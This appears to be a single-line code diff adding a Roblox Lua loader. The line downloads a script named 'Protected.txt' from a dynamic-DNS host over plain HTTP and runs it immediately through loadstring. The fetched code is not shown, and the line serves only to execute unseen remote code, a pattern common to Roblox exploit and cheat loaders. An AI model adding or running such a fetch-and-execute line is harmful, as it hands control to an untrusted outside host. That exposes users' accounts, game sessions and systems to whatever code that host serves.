@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://berngo.duckdns.org/Lel/Protected.txt"))()
